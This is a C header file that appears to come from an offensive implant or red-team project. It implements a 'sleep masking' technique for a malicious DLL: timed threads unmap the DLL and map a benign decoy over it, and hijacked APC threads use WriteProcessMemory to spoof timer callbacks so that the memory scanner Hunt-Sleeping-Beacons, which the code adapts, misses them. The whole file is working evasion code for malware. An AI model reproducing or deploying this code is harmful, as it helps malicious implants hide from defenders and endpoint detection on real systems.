#pragma once

#include <Windows.h>
#include "headers.h"



/*------------------------------------------------------------*/

//size of CtxHide and CtxFix is 6, in total 12 threads are created for implmenting the timer callback spoofing tehcnique
int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE DummyEvent, PHANDLE apcThreads, PCONTEXT CtxHide, PCONTEXT CtxFix, PDWORD64 ResumeThreadValue, PDWORD64 SafeCallback, PNT_FUNCTIONS ntFunctions, PVOID NtWaitForSingleObjectAddress, PVOID NtTestAlertAddress) {


    /* --------- HIDING --------- */
    HANDLE hThreads[3] = {0};


    //starting the APC trigger thread
    if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreads[0], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
    {
        return -1;
    }

    CtxHide[0].ContextFlags = CONTEXT_ALL;
    if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreads[0], &CtxHide[0])))
    {
        return -1;
    }

    *(ULONG_PTR*)((CtxHide[0]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxHide[0].Rip = (DWORD64)WaitForSingleObjectEx;
    CtxHide[0].Rcx = (DWORD64)(*EvntHide);
    CtxHide[0].Rdx = (DWORD64)INFINITE;
    CtxHide[0].R8 = FALSE;

    // Set the modified context back to the thread
    if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreads[0], &CtxHide[0])))
    {
        return -1;
    }

    if (!NT_SUCCESS(ntFunctions->NtResumeThread(hThreads[0], NULL)))
    {
        return -1;
    }


    // Create seven threads in suspended state
    for (int i = 1; i < 3; ++i)
    {
        //does not really matter here the function the threads are going to execute
        if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreads[i], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
        {
            return -1;
        }
    }

    // Modify the context of all the threads
    for (int i = 1; i < 3; ++i)
    {
        // Initialize the context structure
        CtxHide[i].ContextFlags = CONTEXT_ALL;
        if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreads[i], &CtxHide[i])))
        {
            return -1;
        }

    }


    

    *(ULONG_PTR*)((CtxHide[1]).Rsp) = (DWORD64)ExitThread;
    CtxHide[1].Rip = (DWORD64)WriteProcessMemory;
    CtxHide[1].Rcx = (DWORD64)(HANDLE)-1;
    CtxHide[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
    CtxHide[1].R8 = (DWORD64)SafeCallback;
    CtxHide[1].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxHide[2]).Rsp) = (DWORD64)ExitThread;
    CtxHide[2].Rip = (DWORD64)WriteProcessMemory;
    CtxHide[2].Rcx = (DWORD64)(HANDLE)-1;
    CtxHide[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
    CtxHide[2].R8 = (DWORD64)SafeCallback;
    CtxHide[2].R9 = (DWORD64)sizeof(PVOID);



    // Set the new context to all the threads
    for (int i = 1; i < 3; ++i)
    {
        // Initialize the context structure
        if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreads[i], &CtxHide[i])))
        {
            return -1;
        }

    }

    //queue the APC threads to the worker thread
    for (int i = 0; i < 2; i++) {
        if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreads[0], (PPS_APC_ROUTINE)ResumeThread, hThreads[i + 1], FALSE, NULL))) {
            return -1;
        }
    }
    //queueing an extra APC for exiting the main thread
    if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreads[0], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
        return -1;
    }


    /* --------- FIXING --------- */
    HANDLE hThreadsFix[3] = { 0 };

    //starting the APC trigger thread
    if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[0], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
    {
        return -1;
    }

    CtxFix[0].ContextFlags = CONTEXT_ALL;
    if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreadsFix[0], &CtxFix[0])))
    {
        return -1;
    }

    *(ULONG_PTR*)((CtxFix[0]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[0].Rip = (DWORD64)WaitForSingleObjectEx;
    CtxFix[0].Rcx = (DWORD64)(*DummyEvent);
    CtxFix[0].Rdx = (DWORD64)19000;
    CtxFix[0].R8 = FALSE;

    // Set the modified context back to the thread
    if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreadsFix[0], &CtxFix[0])))
    {
        return -1;
    }

    if (!NT_SUCCESS(ntFunctions->NtResumeThread(hThreadsFix[0], NULL)))
    {
        return -1;
    }

    // Create seven threads in suspended state
    for (int i = 1; i < 3; ++i)
    {
        //does not really matter here the function the threads are going to execute
        if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[i], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
        {
            return -1;
        }
    }

    // Modify the context of all the threads
    for (int i = 1; i < 3; ++i)
    {
        // Initialize the context structure
        CtxFix[i].ContextFlags = CONTEXT_ALL;
        if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreadsFix[i], &CtxFix[i])))
        {
            return -1;
        }

    }


    *(ULONG_PTR*)((CtxFix[1]).Rsp) = (DWORD64)ExitThread;
    CtxFix[1].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[1].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
    CtxFix[1].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[1].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[2]).Rsp) = (DWORD64)ExitThread;
    CtxFix[2].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[2].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
    CtxFix[2].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[2].R9 = (DWORD64)sizeof(PVOID);



    // Set the new context to all the threads
    for (int i = 1; i < 3; ++i)
    {
        // Initialize the context structure
        if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreadsFix[i], &CtxFix[i])))
        {
            return -1;
        }

    }

    //queue the APC threads to the worker thread
    for (int i = 0; i < 2; i++) {
        if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreadsFix[0], (PPS_APC_ROUTINE)ResumeThread, hThreadsFix[i + 1], FALSE, NULL))) {
            return -1;
        }
    }

    //queueing an extra APC for exiting the main thread
    if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreadsFix[0], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
        return -1;
    }

    //for loop that adds both Thread and ThreadFix to the array of apcThreads
    for (int i = 0; i < 3; i++) {
        apcThreads[i] = hThreads[i];
        apcThreads[i + 3] = hThreadsFix[i];
    }

    return 0;
}


//original unmodified version can be found here
//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, int* arraySize, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {

    //objects for the worker factory
    WORKER_FACTORY_BASIC_INFORMATION wfbi = { 0 };
    FULL_TP_POOL full_tp_pool = { 0 };
    PFULL_TP_TIMER p_tp_timer = NULL, p_head = NULL;
    FULL_TP_TIMER tp_timer = { 0 };
    SIZE_T len = 0;
    TPP_CLEANUP_GROUP_MEMBER ctx = { 0 };
    HMODULE hNtdll = { 0 };
    INT64 highest = 0;
    INT64 second_highest = 0;

    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return -1;
    }
    //retrieve NT functions
    NtQueryInformationWorkerFactoryFunc NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
    if (NtQueryInformationWorkerFactory == NULL) {
        return -1;
    }

    if (NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL) == STATUS_SUCCESS) {

        if (ReadProcessMemory(GetCurrentProcess(), wfbi.StartParameter, &full_tp_pool, sizeof(FULL_TP_POOL), &len) == FALSE) {
            return -1;
        }

        if (full_tp_pool.TimerQueue.RelativeQueue.WindowStart.Root)
            p_tp_timer = CONTAINING_RECORD(full_tp_pool.TimerQueue.RelativeQueue.WindowStart.Root, FULL_TP_TIMER, WindowStartLinks);
        else if (full_tp_pool.TimerQueue.AbsoluteQueue.WindowStart.Root)
            p_tp_timer = CONTAINING_RECORD(full_tp_pool.TimerQueue.AbsoluteQueue.WindowStart.Root, FULL_TP_TIMER, WindowStartLinks);
        else {
            return -1;
        }

        if (ReadProcessMemory(GetCurrentProcess(), p_tp_timer, &tp_timer, sizeof(FULL_TP_TIMER), &len) == FALSE) {
            return -1;
        }

        PLIST_ENTRY pHead = tp_timer.WindowStartLinks.Children.Flink;
        PLIST_ENTRY pFwd = tp_timer.WindowStartLinks.Children.Flink;
        LIST_ENTRY entry = { 0 };
        

        do {

            if (ReadProcessMemory(GetCurrentProcess(), tp_timer.Work.CleanupGroupMember.Context, &ctx, sizeof(TPP_CLEANUP_GROUP_MEMBER), &len) == FALSE) {
                break;
            }
            //print all the tp_timer members

            if ((ctx).FinalizationCallback == ResumeThreadAddress) {
                
                if (tp_timer.DueTime > highest) {
                    second_highest = highest;
                    highest = tp_timer.DueTime;
                    callbackArray[0] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object

                }
                else if (tp_timer.DueTime > second_highest && tp_timer.DueTime <= highest) {
                    second_highest = tp_timer.DueTime;
                    callbackArray[1] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object
                }

                
                (*arraySize)++;

            }


            p_tp_timer = CONTAINING_RECORD(pFwd, FULL_TP_TIMER, WindowStartLinks);
            if (ReadProcessMemory(GetCurrentProcess(), p_tp_timer, &tp_timer, sizeof(FULL_TP_TIMER), &len) == FALSE) {
                break;
            }

            ReadProcessMemory(GetCurrentProcess(), pFwd, &entry, sizeof(LIST_ENTRY), &len);
            pFwd = entry.Flink;

        } while (pHead != pFwd);

    }

    return 0;


}

//original unmodified version can be found here
//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {


    HMODULE hNtdll = { 0 };
    int arraySize = 0;


    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return -1;
    }

    //retrieve syscalls address 
    NtQuerySystemInformationFunc NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {

        return -1;
    }
    NtQueryObjectFunc NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hNtdll, "NtQueryObject");
    if (NtQuerySystemInformation == NULL) {
        return -1;
    }

    // Call NtQuerySystemInformation to get the handles information
    ULONG bufferSize = 0x1000;
    PVOID buffer = NULL;
    NTSTATUS status;
    buffer = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        return -1;
    }

    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        buffer,
        bufferSize,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(NULL, bufferSize *= 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    // NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
    if (!NT_SUCCESS(status)) {
        return -1;
    }


    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
    POBJECT_TYPE_INFORMATION objectTypeInfo;
    //to free still
    objectTypeInfo = (POBJECT_TYPE_INFORMATION)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    for (ULONG_PTR i = 0; i < handleInfo->HandleCount; i++) {

        SYSTEM_HANDLE handle = handleInfo->Handles[i];

        //for each handle i check whether it belongs to my process
        if (handle.ProcessId == GetProcessId(GetCurrentProcess())) {


            if (NtQueryObject((void*)handle.Handle, ObjectTypeInformation, objectTypeInfo, sizeof(OBJECT_TYPE_INFORMATION) * 2, NULL) < 0) {

                continue;
            }
            //if it's a TpWorkerFactory object I enumerate further
            if (!lstrcmpW(objectTypeInfo->Name.Buffer, L"TpWorkerFactory")) {


                if (GetInfoFromWorkerFactory((HANDLE)handle.Handle, ResumeThreadAddress, &arraySize, callbackArray) == -1) {

                    arraySize = 0;
                    continue;
                }
                //Found the right TpWorkerFactory, because i know there are 5 callbacks for the ResumeThread function
                if (arraySize == 5) {

                    if (objectTypeInfo) VirtualFree(objectTypeInfo, 0, MEM_RELEASE);
                    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);
                    return 0;

                }
                arraySize = 0;
            }

        }

    }

    if (objectTypeInfo) VirtualFree(objectTypeInfo, 0, MEM_RELEASE);
    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);
    return -1;

}

/*-----------------------------------------------------------*/

int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PVOID ResumeThreadAddress, PVOID NtTestAlertAddress,PVOID MessageBoxAddress, PVOID NtWaitForSingleObjectAddress) {

    //APC Threads
    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 6 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    //Context APC threads
    CONTEXT* CtxHide = (CONTEXT*)(VirtualAlloc(NULL, 3 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    //context APC threads fix callback
    CONTEXT* CtxFix = (CONTEXT*)(VirtualAlloc(NULL, 3 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    //events for APC threads
    HANDLE   EvntHide = { 0 };
    HANDLE DummyEvent = { 0 };

    //support NT functions 
    HMODULE hNtdll = { 0 };

    //callbackArray for APC to spoof
    PTPP_CLEANUP_GROUP_MEMBER* callbackArray = (PTPP_CLEANUP_GROUP_MEMBER*)VirtualAlloc(NULL, 2 * sizeof(PTPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD64 ResumeThreadValue = (DWORD64) ResumeThreadAddress;
    DWORD64 SafeCallback = (DWORD64) MessageBoxAddress;
    //initializing callback array structs
    for (int i = 0; i < 2; i++) {
        callbackArray[i] = (PTPP_CLEANUP_GROUP_MEMBER)VirtualAlloc(NULL, sizeof(TPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    //sleaping threads = 5 Timers + 6 APC threads
    HANDLE ThreadArray[11] = { NULL };

    //timers variables
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;

    //i create the sync event that would trigger the first thread 
    if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&EvntHide, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        return -1;
    }

    if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&DummyEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        return -1;
    }


    //variables and logic for SLEAPING timers
    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextE = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));


    if (context == NULL || contextB == NULL || contextC == NULL || contextD == NULL || contextE == NULL) {
        return -1;
    }

    context->ContextFlags = CONTEXT_ALL;
    contextB->ContextFlags = CONTEXT_ALL;
    contextC->ContextFlags = CONTEXT_ALL;
    contextD->ContextFlags = CONTEXT_ALL;
    contextE->ContextFlags = CONTEXT_ALL;

    // Create a thread to control
    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[0] == NULL) {

        return -1;
    }
    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[1] == NULL) {

        return -1;
    }
    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[2] == NULL) {

        return -1;
    }
    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[3] == NULL) {

        return -1;
    }
    ThreadArray[4] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SetEvent, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[4] == NULL) {

        return -1;
    }


    GetThreadContext(ThreadArray[0], context);//unmap
    GetThreadContext(ThreadArray[1], contextB);//mapex
    GetThreadContext(ThreadArray[2], contextC);//unmap
    GetThreadContext(ThreadArray[3], contextD);//mapex
    GetThreadContext(ThreadArray[4], contextE);//mapex


    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
    (*context).Rip = (DWORD64)UnmapViewOfFile;
    (*context).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
    (*contextB).Rcx = (DWORD64)sacDllHandle;
    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
    (*contextB).R8 = (DWORD64)0x00;
    (*contextB).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextB).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextB).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)ExitThread;
    (*contextC).Rip = (DWORD64)UnmapViewOfFile;
    (*contextC).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
    (*contextD).Rcx = (DWORD64)malDllHandle;
    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*contextD).R8 = (DWORD64)0x00;
    (*contextD).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    //one more thread to trigger the APC threads for the callbacks spoofing
    *(ULONG_PTR*)((*contextE).Rsp) = (DWORD64)ExitThread;
    (*contextE).Rip = (DWORD64)SetEvent;
    (*contextE).Rcx = (DWORD64)(EvntHide);

    SetThreadContext(ThreadArray[0], context);//unmap
    SetThreadContext(ThreadArray[1], contextB);//map
    SetThreadContext(ThreadArray[2], contextC);//unmap 
    SetThreadContext(ThreadArray[3], contextD);//mapmal
    SetThreadContext(ThreadArray[4], contextE);//setevent   

    hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        return -1;
    }

    

    if (ResumeThreadValue != NULL && SafeCallback != NULL) {
        //these two need to be bit longer in order for the spoofing to work properly, needs more testing for a more precise waiting
        //i need to wait to enumerate all the callbacks before unmapping the view
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[0], 800, 0, WT_EXECUTEINTIMERTHREAD);//unamp
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[1], 900, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[4], 1000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[2], 20100, 0, WT_EXECUTEINTIMERTHREAD);//unmap
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[3], 20200, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
		
        //TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
        if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray) == 0) {
            
            //i should run SleapingAPC here so that all those contexts are available
            if (SleapingAPCNG(callbackArray, &EvntHide, &DummyEvent, ApcThreads, CtxHide, CtxFix, &ResumeThreadValue, &SafeCallback, ntFunctions, NtWaitForSingleObjectAddress, NtTestAlertAddress) == 0) {
                
                int counter = 5;
                for (int i = 0; i < 6; i++) {

                    //adding the newly created APC threads to the thread array to be waiting for
                    ThreadArray[counter] = ApcThreads[i];//5 + 6
                    counter++;

                }
            }
            else {
                return -1;
            }
        }
        else {
            return -1;
        }
    }
    else {
        return -1;
    }

    if (WaitForMultipleObjects(11, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
        return -1;
    }

    //good morning
    if (DeleteTimerQueue(hTimerQueue) == 0) {

        return -1;
    }
    //clean up totale
    if (context) VirtualFree(context, 0, MEM_RELEASE);
    if (contextB) VirtualFree(contextB, 0, MEM_RELEASE);
    if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
    if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
    if (contextE) VirtualFree(contextE, 0, MEM_RELEASE);
    for (int i = 0; i < 2; i++) {
        if (callbackArray[i] != NULL) {
            VirtualFree(callbackArray[i], 0, MEM_RELEASE);
        }
    }
    if (callbackArray) VirtualFree(callbackArray, 0, MEM_RELEASE);
    if (ApcThreads) VirtualFree(ApcThreads, 0, MEM_RELEASE);
    if (CtxFix) VirtualFree(CtxFix, 0, MEM_RELEASE);
    if (CtxHide) VirtualFree(CtxHide, 0, MEM_RELEASE);
   // if (ResumeThreadValue) VirtualFree(ResumeThreadValue, 0, MEM_RELEASE);
	//if (SafeCallback) VirtualFree(SafeCallback, 0, MEM_RELEASE);
    if (EvntHide) CloseHandle(EvntHide);
    if (DummyEvent) CloseHandle(DummyEvent);


    return 0;

}